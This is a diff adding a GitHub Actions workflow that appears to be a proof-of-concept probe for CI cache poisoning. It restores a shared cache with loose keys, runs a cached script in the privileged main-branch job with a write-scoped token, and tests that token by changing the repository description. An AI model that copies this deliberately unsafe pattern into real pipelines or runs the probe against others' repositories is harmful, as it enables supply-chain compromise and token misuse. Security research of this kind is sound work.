@@ -1,0 +1,33 @@
+name: trusted-build
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Restore shared cache
+        id: rc
+        uses: actions/cache/restore@v4
+        with:
+          path: deps
+          key: build-deps-shared-v1
+          restore-keys: |
+            build-deps-
+      - name: Show cache hit + content
+        run: |
+          echo "cache-hit=${{ steps.rc.outputs.cache-hit }}"
+          echo "cache-matched-key=${{ steps.rc.outputs.cache-matched-key }}"
+          echo "=== deps dir ==="
+          ls -la deps/ 2>/dev/null || echo "NO DEPS DIR"
+          if [ -f deps/build-dep.sh ]; then
+            echo "=== EXECUTING CACHED SCRIPT IN TRUSTED MAIN CONTEXT ==="
+            bash deps/build-dep.sh
+            echo "TOKEN_CAN_WRITE_TEST:"
+            curl -s -o /dev/null -w "%{http_code}" -X PATCH -H "Authorization: token ${{ github.token }}" https://api.github.com/repos/${{ github.repository }} -d '{"description":"cache-poison-probe"}'
+          else
+            echo "NO POISONED SCRIPT RESTORED"
+          fi
